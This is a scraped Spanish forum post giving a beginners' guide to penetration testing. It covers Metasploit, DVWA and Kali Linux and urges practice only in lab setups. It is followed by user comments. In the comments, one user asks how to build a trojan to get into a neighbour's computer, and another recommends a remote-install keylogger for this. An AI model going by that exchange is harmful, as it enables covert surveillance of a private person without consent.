Sans MS;">Ficha técnica</span></font></span></span></div><br />[ul]<span style="color: #57402b;">[li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Herramienta: Metasploit</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Sitio web: <a href="http://www.metasploit.com/" target="_blank" rel="nofollow"><span style="color: #fb8f53;">metasploit .com/</span></a></span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Dónde empezar: una vez instalado, haz la prueba con alguna vulnerabilidad que permita el uso de una consola meterpreter remota, son sencillas de probar si fueron exitosas. Hay que tener precaución con las vulnerabilidades de denegación de servicio.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Más información: Existe un documento oficial completo para dar los primeros pasos en Metasploit Framework, muy recomendable, ?<a href="https://community.rapid7.com/docs/DOC-1565" target="_blank" rel="nofollow"><span style="color: #fb8f53;">Metasploit Community Getting Started Guide</span></a>&quot;.</span></font>[/li]</span>[/ul]<div style="text-align: justify;"><span style="color: #3d668e;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">4. DVL ? DVWA</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Para probar las tres herramientas anteriores, es necesario definir un sistema objetivo, un sistema en el que se harán las pruebas. Una pésima costumbre de quienes inician en este ámbito es realizar sus primeros pasos y pruebas en sistemas públicos de Internet, en un entorno real. Esto podría acarrear problemas legales y no es la forma correcta (ni ética) de realizarlo. Para aprender a usar estas herramientas, se debe utilizar un entorno de pruebas, es decir, un escenario de investigación en donde uno pueda tener acercamientos sin riesgos de afectar algún entorno en producción.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Para ello, existen dos herramientas excelentes: Damn Vulnerable Linuxy (DVL) y Damn Vulnerable Web Application (DVWA). Aunque el primero está descontinuado, aún se puede conseguir en Internet para hacer los primeros pasos y primeras pruebas. Se trata de un sistema operativo y una aplicación web que poseen todo tipo de vulnerabilidades, de tal forma que, la persona que los utiliza, puede intentar explotarlas y experimentar.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">También es posible ?construir? nuestro propio sistema de pruebas: tan solo instala cualquier sistema operativo (desactiva las actualizaciones o instala una versión antigua) y sobre él comienza a instalar servicios en versiones anteriores a la última. De esta forma, tendrás tu propio sistema vulnerable para hacer pruebas. Este entorno es el correcto para dar tus primeros pasos en Penetration Testing.</span></font></span></div><br /><div align="center"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"><img id="img_post" src="http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson1/index.473.jpg" border="0"><br />Imagen 4. Damn Vulnerable Web Application (computersecuritystudent.com)</span></font></span></div><br /><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"> </span></font></span><br /><div style="text-align: justify;"><span style="color: #57402b;"><span style="text-decoration: underline;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Ficha técnica</span></font></span></span></div><br />[ul]<span style="color: #57402b;">[li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Herramienta: Damn Vulnerable Web Application</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Sitio web: <a href="http://www.dvwa.co.uk/" target="_blank" rel="nofollow"><span style="color: #fb8f53;">dvwa .co.uk/</span></a></span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Dónde empezar: Instala el programa e intenta encontrar y explotar vulnerabilidades comunes con la herramienta anterior.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Más información: la aplicación posee información adicional</span></font>[/li]</span>[/ul]<div style="text-align: justify;"><span style="color: #3d668e;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">5. Kali Linux (Backtrack)</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Finalmente, hay una distribución de Linux diseñada exclusivamente para Penetration Testing. Las herramientas antes descritas (Nmap, Nessus, Metasploit) están disponibles y, no solo eso, también hay muchas más herramientas para continuar practicando. Por ejemplo, Kali (antes conocida como Backtrack) es una distribución que posee todo tipo de herramientas preinstaladas que sirven para realizar Penetration Testing.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">El orden en que se presentaron las herramientas no es aleatorio, es lo recomendable para comenzar a experimentar. Primero hay que probarlas de forma aislada y luego, abocarse completamente a Kali Linux.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Kali Linux puede ser descargada como imagen ISO o directamente para VMWare. Una vez que inicias un sistema Kali Linux, verás un menú muy extenso con más de 300 herramientas para pentesters. Nmap y Metasploit Framework están incluidos en esta lista, entre otros.</span></font></span></div><br /><div align="center"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"><img id="img_post" src="https://1.bp.blogspot.com/-QfyibJf5F8o/UUIieVj8gRI/AAAAAAAAIpw/w7lyrlZ9B0Y/s1600/KaliLinux-Most-Advanced-Pen-Testing-Distribution.jpg" border="0"><br />Imagen 5. Menú de Kali Linux (voiceofgreyhat.com)</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Para una mejor comprensión, las herramientas son presentadas en diferentes categorías, aquí algunas de las más importantes:</span></font></span></div><br /><div align="center"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"><img id="img_post" src="http://revista.seguridad.unam.mx/sites/revista.seguridad.unam.mx/files/images/pruebas_pen-01.jpg" border="0"></span></font></span></div><br />[ul]<span style="color: #57402b;">[li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Information gathering: Herramientas de recolección de datos que ofrecen información sobre los objetivos de los análisis, especialmente herramientas de DNS, dominios y direcciones IP. Nmap está en esta categoría.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Aplicaciones web: Herramientas diseñadas para realizar análisis en sitios web a nivel de servidores. Recomendaciones para esta sección: Nikto y w3af para encontrar vulnerabilidades en los sitios.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Ataques a contraseñas: Herramientas para hacer cracking de contraseñas, de forma tal, que se prueban ataques de fuerza bruta o diccionario para encontrar las contraseñas de acceso correctas a un formulario o sistema.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Ataques inalámbricos: Cuando un atacante está conectado a una red wireless puede ejecutar algunos ataques, especialmente cuando intenta interceptar información que está siendo transmitida mediante esa red inalámbrica. Estas herramientas permiten analizar la red y diagnosticar su seguridad.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Herramientas de explotación: Metasploit Framework es la clave de esta sección, entre otras herramientas que permiten explotar vulnerabilidades.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Sniffing/Spoofing: Wireshark y Ettercap son las herramientas más recomendables. Con ellas, es posible ver el tráfico de red que podría permitir el acceso a información confidencial, entre otros ataques.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Ingeniería inversa: Ollydbg es uno de los mejores debuggers que podrían ayudar a comprender qué acciones realiza un archivo en el sistema por medio de un proceso de ingeniería inversa.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Forense: También hay una serie de herramientas para realizar análisis forenses sobre un sistema, es decir, se puede analizar el estado de un sistema justo en el momento que ocurrió determinado incidente; además se identifican acciones pasadas o archivos ocultos en el mismo, entre otros.</span></font>[/li]</span>[/ul]<div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"><br /><span style="text-decoration: underline;">Ficha técnica</span></span></font></span></div><br />[ul]<span style="color: #57402b;">[li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Herramienta: Kali Linux</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Sitio web: <a href="http://www.kali.org/" target="_blank" rel="nofollow"><span style="color: #fb8f53;">kali. org/</span></a></span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Cómo empezar: primero, probar las herramientas antes listadas pero desde dentro de Kali Linux y luego, adentrarse en su menú, donde las herramientas están categorizadas, lo que permitirá mayor comprensión.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Más información: hay documentos disponibles en el <a href="http://docs.kali.org/" target="_blank" rel="nofollow"><span style="color: #fb8f53;">sitio oficial</span></a> en varios idiomas, para conocer más en detalle el kit de herramientas.</span></font>[/li]</span>[/ul]<div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">6. La sexta herramienta: nuestro cerebro</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Hay una falsa idea de que una prueba de penetración es la ejecución de una serie de herramientas en un orden determinado. Esto no es así, la elección de las herramientas, la ejecución de tareas manuales y la utilización de una metodología, son tan solo algunas de las variables para convertirse en un profesional de Penetration Testing. Sin embargo, un factor común en todo el proceso, es que tenemos que pensar. </span></font><img id="img_post" src="http://revista.seguridad.unam.mx/sites/revista.seguridad.unam.mx/files/images/pruebas_pen-03.jpg" border="0"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Hay dos tipos de ethical hacker, aquel que solo lee y utiliza lo que dicen las herramientas y aquel que interpreta y pone su inteligencia para ofrecer un informe que realmente brinde valor a su cliente, aquella empresa u organización que necesita conocer cómo mejorar la protección de la información y su infraestructura.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Los atacantes no solo ejecutan herramientas, sino que piensan cómo atacar. Al momento de realizar un Pentest es fundamental no perder de vista nuestra herramienta principal: pensar. Independientemente de las herramientas de software que utilicemos, pensar constantemente como un atacante,  es la clave principal para realizar un Penetration Testing de forma exitosa.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"> </span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">¿Qué debes hacer ahora? Solo toma esta guía, descarga las herramientas e intenta utilizarlas. Probablemente en una primera instancia tengas más preguntas que respuestas y si así fuera, esa es la mejor manera de comenzar.</span></font></span></div><script src="https://www.google.com/recaptcha/api.js?hl=es&onload=onloadCallback&render=explicit" async defer></script><div style="width:728px; margin: 10px 0 10px -15px;" class="clearfix"></div><center><a href="https://www.identi.io/">descargar peliculas</a> - <a href="https://www.identi.io/index.php?cat=25">descargar programas</a></center>
+<div id="tipsy_bottom">
+</div>
+</div>
+<div class="clearfix info_post">
+<div class="general_stats floatL">
+<div class="clearfix" style="margin:0 0 8px;">
+<span class="stats points" ><img width="16" height="16" src="/images/coins.png"> <b id="cant_pts_post">27</b> Puntos</span>
+<span class="stats"><img width="16" height="16" src="/images/if16.png"> Score:<b> 6.8/10</b></span>
+</div>
+<div class="clearfix">
+<span class="stats"><img width="16" height="16" src="/images/visitas.png"> Visitas: <b class="icons visitas">8532</b> </span>
+<span class="stats"><img width="16" height="16" src="/images/star.png"> Favoritos: <b class="icons fav" id="cant_favs_post">39</b> </span></div>
+</div><div class="floatR clearfix dar_puntos"><div class="clearfix" id="contenedor"><span class="titulo"> Califica este Post:</span><span><a class="puntos require-login pts-1" onclick="darpuntos.post(378856,1);return false"> 1 </a><a class="puntos require-login pts-2" onclick="darpuntos.post(378856,2);return false"> 2 </a><a class="puntos require-login pts-3" onclick="darpuntos.post(378856,3);return false"> 3 </a><a class="puntos require-login pts-4" onclick="darpuntos.post(378856,4);return false"> 4 </a><a class="puntos require-login pts-5" onclick="darpuntos.post(378856,5);return false"> 5 </a><a class="puntos require-login pts-6" onclick="darpuntos.post(378856,6);return false"> 6 </a><a class="puntos require-login pts-7" onclick="darpuntos.post(378856,7);return false"> 7 </a><a class="puntos require-login pts-8" onclick="darpuntos.post(378856,8);return false"> 8 </a><a class="puntos require-login pts-9" onclick="darpuntos.post(378856,9);return false"> 9 </a><a class="puntos require-login pts-gold" onclick="darpuntos.post(378856,10);return false"> 10 </a></span>
+</div></div></div><!---fin info post ---><div class="votaron"><span id="mostrar_lista" onclick="$('#lista').slideToggle('fast');">Ver los usuarios que votaron...</span>
+<span id="lista" style="display:none;" class="clearfix lista_votos" ">
+<ul><center><li><img id="error_avatar" src="http://imgfz.com/i/QXNKw3p.jpeg" width="24" height="24"/><span class="text"> <a href="https://identi.io/index.php?action=profile;u=1593733" title="perfil de mapodito"> mapodito</a>: <b>2 pts</b></span>  </li><li><img id="error_avatar" src="https://1.bp.blogspot.com/-T4O7-fd3_N4/UcQ7g30hZiI/AAAAAAAAJ60/gkdXudkB4Jc/s640/sloth-Italian-Spiderman-reaction-face.gif" width="24" height="24" /><span class="text"> <a href="https://identi.io/index.php?action=profile;u=1647773" title="perfil de kenneth10"> kenneth10</a>: <b>5 pts</b></span>  </li><li><img id="error_avatar" src="https://t0.gstatic.com/images?q=tbn:ANd9GcQY5358sJSrnXixNFEAmH5MWaZ3tOnNGKqisS7Oka5S5Ft-A9HfGQ" width="24" height="24" /><span class="text"> <a href="https://identi.io/index.php?action=profile;u=1899399" title="perfil de TomasCabj7"> TomasCabj7</a>: <b>10 pts</b></span>  </li><li><img id="error_avatar" src="https://2.bp.blogspot.com/-JCh02ZSYGJ8/V8iP5JjvMUI/AAAAAAAAAuI/rl1xTVElAm0ws_FiFdOxnoKSngLyKVU_wCK4B/s1600/braid_zpsb55ebed3.png" width="24" height="24" /><span class="text"> <a href="https://identi.io/index.php?action=profile;u=1945876" title="perfil de Gurami"> Gurami</a>: <b>10 pts</b></span>  </li></center></ul></span></div>
+<div class="clearfix opciones_post">
+<!---<div>Opciones </div>---><div class="clearfix interact_post">
+<span id="favs" class="button ui-favs require-login" onclick="favs.add(378856);">Agregar a Favoritos</span>
+<span  id="denun" class="button ui-flag require-login" title="Denunciar post" onclick="denunciar.post.load('378856');" >Denunciar</span>
+</div><div class="clearfix accion_post">
+</div>
+</div>
+<div class="clearfix sugerencias">
+<div class="clearfix sugerir-post floatL">
+<span class="titulo">M&aacute;s del Autor...</span>
+<ul class="zebra post_rel"><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_42"></i>
+<a href="https://identi.io/index.php?topic=518145" title="Baki 2018 Sub Español HD capitulo 1-19 MG"> Baki 2018 Sub Español HD capitulo 1-19 MG</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_25"></i>
+<a href="https://identi.io/index.php?topic=517900" title="Emulador De Android Para Pc a 60 fps Descarga"> Emulador De Android Para Pc a 60 fps Descarga</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_25"></i>
+<a href="https://identi.io/index.php?topic=517730" title="Sony Vegas Pro 16 Español 2018 + Plugin Sapphire "> Sony Vegas Pro 16 Español 2018 + Plugin Sapphire </a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_42"></i>
+<a href="https://identi.io/index.php?topic=517457" title="Peliculas Dragon Ball Multi Idioma 1080P MG"> Peliculas Dragon Ball Multi Idioma 1080P MG</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_431"></i>
+<a href="https://identi.io/index.php?topic=509281" title="Nuevos Temas Dark Custom Windows 10 Fall Creators "> Nuevos Temas Dark Custom Windows 10 Fall Creators </a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_11"></i>
+<a href="https://identi.io/index.php?topic=508735" title="Proyecto Eldewrito 6.0 Halo online MG"> Proyecto Eldewrito 6.0 Halo online MG</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_11"></i>
+<a href="https://identi.io/index.php?topic=508320" title="Descargar HALO 2  En Español + Online Gratis MG"> Descargar HALO 2  En Español + Online Gratis MG</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_11"></i>
+<a href="https://identi.io/index.php?topic=507463" title="Descargar Emulador ps1 + Saga Crash Bandicoot"> Descargar Emulador ps1 + Saga Crash Bandicoot</a></span></span></li></ul></div>
+<div class="clearfix floatR" style="margin:0 30px;" >
+
+</div>
+</div><div id="all_coments" class="all_coments clearfix">
+<span class="num_comments "> <span id="num_com_add">24</span> Comentarios</span>
+<span class="onpost"> Pruebas de penetración para principiantes </span>
+<div class="comentario"></div><div id="comment_4076427" class="comentario coment_id_1">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="Capote" href="?action=profile;user=Capote">
+<img id="error_avatar" src="http://s7.directupload.net/images/121005/dorzh3sb.jpg" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1545887" href="?action=profile;user=Capote">Capote</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1435675954" title="30/06/2015 a las 14:52 ">hace m&aacute;s de 10 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+Gracias por la info! justamente en un mes termino un curso semestral de esto...
+</div>
+</div>
+</div>
+</div><div id="comment_4076449" class="comentario coment_id_2">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="Miguel297" href="?action=profile;user=Miguel297">
+<img id="error_avatar" src="http://2.1m.yt/obrt_mH_z.jpg" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1823925" href="?action=profile;user=Miguel297">Miguel297</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1435676504" title="30/06/2015 a las 15:01 ">hace m&aacute;s de 10 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+donde o como creo un troyano para poder meterme a la computadora de mi vecina (posdata esta mas buena que el pan de cada dia &nbsp;<img src="https://identi.io/Smileys/default/icon_twisted.png" alt="" border="0" />)<br />jjajajajaa <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /><br />&nbsp;<img src="https://identi.io/Smileys/default/icon_twisted.png" alt="" border="0" />
+</div>
+</div>
+</div>
+</div><div id="comment_4076457" class="comentario coment_id_3">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="serbarma" href="?action=profile;user=serbarma">
+<img id="error_avatar" src="http://3tuning.ru/image/cache/data/goods/music/061_DJ_inside-320x320.png" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="71976" href="?action=profile;user=serbarma">serbarma</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1435676842" title="30/06/2015 a las 15:07 ">hace m&aacute;s de 10 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+Gracias, no le?
+</div>
+</div>
+</div>
+</div><div id="comment_4076458" class="comentario coment_id_4">
+<div class="clearfix comment-box is-user ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="xsparda" href="?action=profile;user=xsparda">
+<img id="error_avatar" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8dCV3U60fG1pEAWV75cnHjWv1Qvg4ohDXAi1SEQ1TaiGIfCSl" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1790349" href="?action=profile;user=xsparda">xsparda</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1435676870" title="30/06/2015 a las 15:07 ">hace m&aacute;s de 10 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+si quieres un troyano puedes utilizar blazing perfect keylogger en instalacion remota....es facil de untilizar
+</div>
+</div>
+</div>
+</div><div id="comment_4076474" class="comentario coment_id_5">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="matt_1210" href="?action=profile;user=matt_1210">
+<img id="error_avatar" src="https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-ash3/1390652_572233939513979_1304914952_n.jpg" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1832840" href="?action=profile;user=matt_1210">matt_1210</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1435677519" title="30/06/2015 a las 15:18 ">hace m&aacute;s de 10 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+buena info
+</div>
+</div>
+</div>
+</div><div id="comment_4076508" class="comentario coment_id_6">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="norton48" href="?action=profile;user=norton48">
+<img id="error_avatar" src="https://4.bp.blogspot.com/-2FSUU2JjnD8/UGCRUBY2xYI/AAAAAAAAABw/2f0u9opz4rg/s1600/Pink+Floyd+Wallpaper+04.jpg" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1601932" href="?action=profile;user=norton48">norton48</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1435678714" title="30/06/2015 a las 15:38 ">hace m&aacute;s de 10 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+<a usuario="1823925" href="https://identi.io/index.php?action=profile&user=Miguel297" class="mensiones_identi">@Miguel297</a> &nbsp;<img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" />
+</div>
+</div>
+</div>
+</div><div id="comment_4076567" class="comentario coment_id_7">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
+<a  rel="nofollow" title="Miguel297" href="?action=profile;user=Miguel297">
+<img id="error_avatar" src="http://2.1m.yt/obrt_mH_z.jpg" width="70" height="70" />
+</a>
+</div>
+<div class="floatR comment-body">
+<div class="clearfix comment-info">
+<div class="floatL">
+<a class="nick mensiones_identi" rel="nofollow" usuario="1823925" href="?action=profile;user=Miguel297">Miguel297</a><span> - <a rel="nofollow" class="addtipsy_s" ts="1435680580" title="30/06/2015 a las 16:09 ">hace m&aacute;s de 10 a&ntilde;os</a>  </span>
+</div>
+<div class="com_opt" id="com_opt" style="display:none;"></div></div><div class="comment-content clearfix">
+yo probe el Spy-Net 2.6 sin obtener buenos resultados &nbsp;<img src="https://identi.io/Smileys/default/icon_confused.png" alt="" border="0" /><br />lo unico que consegui fui infectarme yo mismo jajajajaja &nbsp;<img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /><br />algun buen hacker que quiera instruirnos en el asunto <br />&nbsp;<img src="https://identi.io/Smileys/default/icon_twisted.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_twisted.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_twisted.png" alt="" border="0" /><br />&nbsp;<img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" /> <img src="https://identi.io/Smileys/default/icon_biggrin.png" alt="" border="0" />
+</div>
+</div>
+</div>
+</div><div id="comment_4076589" class="comentario coment_id_8">
+<div class="clearfix comment-box is-normal ">
+<div class="floatL fondoavatar">
